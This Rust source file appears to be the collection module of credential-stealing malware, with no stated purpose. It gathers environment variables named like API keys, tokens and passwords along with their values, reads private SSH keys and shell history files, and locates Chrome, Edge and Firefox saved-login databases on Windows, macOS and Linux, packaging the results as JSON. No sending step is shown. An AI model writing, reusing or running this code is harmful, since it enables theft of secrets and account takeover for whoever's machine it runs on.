use serde_json::{Value};
use std::path::Path;

pub fn env_secrets() -> Value {
    let interesting = [
        "API_KEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD",
        "AWS_", "AZURE_", "GCP_", "GITHUB_", "PRIVATE_KEY",
    ];
    let vars: Vec<Value> = std::env::vars()
        .filter(|(k, _)| {
            let ku = k.to_uppercase();
            interesting.iter().any(|pat| ku.contains(pat))
        })
        .map(|(k, v)| serde_json::json!({ "key": k, "value": v }))
        .collect();
    Value::Array(vars)
}

pub fn ssh_keys(home: &str) -> Value {
    let ssh_dir = format!("{home}/.ssh");
    let key_names = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"];
    let keys: Vec<Value> = key_names
        .iter()
        .filter_map(|name| {
            let path = format!("{ssh_dir}/{name}");
            std::fs::read_to_string(&path)
                .ok()
                .map(|content| serde_json::json!({ "file": name, "content": content }))
        })
        .collect();
    Value::Array(keys)
}

#[cfg(target_os = "windows")]
pub fn shell_history(_home: &str) -> Value {
    let profile = std::env::var("USERPROFILE").unwrap_or_default();
    let path = format!(
        "{profile}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
    );
    let content = std::fs::read_to_string(&path).unwrap_or_default();
    Value::Array(content.lines().map(|l| Value::String(l.to_string())).collect())
}

#[cfg(not(target_os = "windows"))]
pub fn shell_history(home: &str) -> Value {
    let candidates = [
        format!("{home}/.bash_history"),
        format!("{home}/.zsh_history"),
        format!("{home}/.fish/fish_history"),
    ];
    let content = candidates
        .iter()
        .find_map(|p| std::fs::read_to_string(p).ok())
        .unwrap_or_default();
    Value::Array(content.lines().map(|l| Value::String(l.to_string())).collect())
}

#[cfg(target_os = "windows")]
pub fn browser_db_paths(_home: &str) -> Value {
    let profile = std::env::var("USERPROFILE").unwrap_or_default();
    let paths = [
        format!("{profile}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
        format!("{profile}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
        format!("{profile}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
    ];
    Value::Array(
        paths
            .into_iter()
            .filter(|p| Path::new(p).exists())
            .map(Value::String)
            .collect(),
    )
}

#[cfg(target_os = "macos")]
pub fn browser_db_paths(home: &str) -> Value {
    let paths = [
        format!("{home}/Library/Application Support/Google/Chrome/Default/Login Data"),
        format!("{home}/Library/Application Support/Microsoft Edge/Default/Login Data"),
        format!("{home}/Library/Application Support/Firefox/Profiles"),
    ];
    Value::Array(
        paths
            .into_iter()
            .filter(|p| Path::new(p).exists())
            .map(Value::String)
            .collect(),
    )
}

#[cfg(target_os = "linux")]
pub fn browser_db_paths(home: &str) -> Value {
    let paths = [
        format!("{home}/.config/google-chrome/Default/Login Data"),
        format!("{home}/.config/microsoft-edge/Default/Login Data"),
        format!("{home}/.mozilla/firefox"),
    ];
    Value::Array(
        paths
            .into_iter()
            .filter(|p| Path::new(p).exists())
            .map(Value::String)
            .collect(),
    )
}
